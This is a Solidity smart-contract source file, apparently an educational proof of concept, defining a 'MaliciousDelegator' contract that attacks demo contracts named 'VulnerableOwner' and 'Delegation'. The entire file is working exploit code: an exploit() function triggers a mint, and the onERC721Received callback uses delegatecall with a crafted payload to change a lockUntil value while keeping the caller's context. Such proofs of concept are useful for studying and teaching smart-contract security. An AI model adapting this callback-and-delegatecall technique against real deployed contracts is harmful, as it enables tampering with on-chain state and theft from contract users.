// SPDX-License-Identifier: AGPL-3.0-only

pragma solidity 0.8.12;

import {ERC721TokenReceiver} from "@solmate/tokens/ERC721.sol";

import {Delegation} from "./Delegation.sol";
import {VulnerableOwner} from "./VulnerableOwner.sol";

/// @title Malicious Token Receiver Delegators
/// @author andreas@nascent.xyz
/// @dev Maliciously delegates calls on token reception to maintain msg.sender context
contract MaliciousDelegator is ERC721TokenReceiver {

  /// @notice Owner Custom Error
  error OnlyOwner();

  /// @dev The Delegation contract we want to exploit
  Delegation public delegation;

  /// @dev The vulnerable owner
  VulnerableOwner public vo;

  /// @notice The contract owner
  address public owner;

  /// @notice The amount we want to change lockUntil to
  uint96 public constant LOCK_UNTIL = 100_000;

  /// @notice Constructs the Malicious Delegator
  constructor() {
    owner = msg.sender;
  }

  /// @notice Allows the owner to set the delegation contract address
  function setDelegation(Delegation d) external onlyOwner {
    delegation = d;
  }

  /// @notice Allows the owner to set the vulnerable owner contract address
  function setVulnerableOwner(VulnerableOwner vo_) external onlyOwner {
    vo = vo_;
  }

  /// @notice The main exploit function
  /// @dev Calls the Vulnerable owner which falls back to `onERC721Received here
  function exploit() public onlyOwner {
    vo.mint();
  }

  /// @notice Malicious receiving logic that executes a delegatecall to the delegation contract
  function onERC721Received(address, address, uint256, bytes calldata) public virtual override returns (bytes4) {
    // Construct malicious payload
    bytes memory payload = abi.encodeWithSignature("setLockUntil(uint96)", LOCK_UNTIL);

    // Maliciously delegate call
    (bool success, bytes memory retData) = address(delegation).delegatecall(payload);
    require(success, "Delegation Failed");

    // Return the function selector to prevent revert
    return ERC721TokenReceiver.onERC721Received.selector;
  }

  /// @notice Modifier to only allow the contract owner to call a function
  modifier onlyOwner() {
    if (msg.sender != owner) revert OnlyOwner();
    _;
  }
}
